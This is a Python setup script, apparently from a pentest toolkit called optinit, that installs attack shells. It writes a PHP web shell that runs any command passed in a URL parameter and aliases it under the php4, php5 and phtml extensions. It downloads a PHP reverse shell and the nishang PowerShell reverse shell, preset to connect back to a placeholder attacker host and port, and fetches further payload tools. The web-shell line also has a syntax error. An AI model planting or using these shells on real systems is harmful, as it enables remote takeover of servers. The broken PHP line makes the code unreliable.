#!/usr/bin/python3
#
# install_shell.py Copyright (C) Lazula 2021
# Distributed under GNU GPLv3 or later
# Further license information at end of file


import requests
import logging
import os
import gzip
import subprocess
import shutil


def install_php_shells(php_shell_dir, ignore_errors=False):
    os.makedirs(php_shell_dir, exist_ok=True)
    old_cwd = os.getcwd()
    # Need to chdir to get relative instead of absolute symlinks
    os.chdir(php_shell_dir)

    shell_alias_extensions = ["php4", "php5", "phtml"]

    # Command shells are so simple that packaging them separately is overkill
    with open("cmd.php", "w") as f:
        f.write('<?php shell_exec($_GET["cmd"]; ?>\n')

    # Create aliases with different file extensions
    for shell_alias_ext in shell_alias_extensions:
        os.symlink("cmd.php", f"cmd.{shell_alias_ext}")

    # Fetch and process the reverse shell
    php_reverse_shell_contents = requests.get("https://github.com/pentestmonkey/php-reverse-shell/raw/8aa37ebe03d896b432c4b4469028e2bed75785f1/php-reverse-shell.php").text
    php_reverse_shell_contents = php_reverse_shell_contents.replace("$ip = '127.0.0.1';  // CHANGE THIS", "$ip = 'REPLACEME_LHOST';")
    php_reverse_shell_contents = php_reverse_shell_contents.replace("$port = 1234;       // CHANGE THIS", "$port = REPLACEME_LPORT;")

    with open("php-reverse-shell.php", "w") as f:
        f.write(php_reverse_shell_contents)

    for shell_alias_ext in shell_alias_extensions:
        os.symlink("php-reverse-shell.php", f"php-reverse-shell.{shell_alias_ext}")

    os.chdir(old_cwd)


def install_python_pty_shells(shell_dir, ignore_errors=False):
    old_cwd = os.getcwd()
    os.chdir(shell_dir)

    if not os.path.isdir(os.path.join(shell_dir, "python-pty-shells")):
        subprocess.run(["git", "clone", "https://github.com/infodox/python-pty-shells"], stderr=subprocess.DEVNULL)

    os.chdir(old_cwd)


def install_shell(install_dir, ignore_errors=False):
    shell_dir = os.path.join(install_dir, "shell")
    original_dir = os.path.join(shell_dir, "original")
    os.makedirs(original_dir, exist_ok=True)
    old_cwd = os.getcwd()

    install_php_shells(os.path.join(original_dir, "php"), ignore_errors)
    install_python_pty_shells(original_dir, ignore_errors)

    # Install reverse shells to shell/original
    reverse_shells = ["web.config"]
    for reverse_shell in reverse_shells:
        shutil.copy2(os.path.join("shell", reverse_shell), original_dir)

    # Add shell command to nishang reverse shell
    with open(os.path.join(original_dir, "Invoke-PowerShellTcp.ps1"), "w") as f:
        f.write(requests.get("https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1").text)
        f.write("\nInvoke-PowerShellTcp -Reverse -IPAddress REPLACEME_LHOST -Port REPLACEME_LPORT\n")

    # Install non-reverse shell to shell
    file_shells = ["cmd.aspx", "setuid.c"]
    for file_shell in file_shells:
        shutil.copy2(os.path.join("shell", file_shell), shell_dir)

    # Get unicorn
    unicorn_path = os.path.join(shell_dir, "unicorn.py")
    with open(unicorn_path, "w") as f:
        f.write(requests.get("https://raw.githubusercontent.com/trustedsec/unicorn/master/unicorn.py").text)
    os.chmod(unicorn_path, 0o755)

    # Initialize with a placeholder IP and port
    subprocess.run(["/bin/bash", os.path.join(install_dir, "userbin", "set_host_port.sh"), "127.0.0.1", "4444"])

    os.chdir(old_cwd)
    return 0


""" This file is part of optinit.

    optinit is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    optinit is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with optinit.  If not, see <https://www.gnu.org/licenses/>.
"""
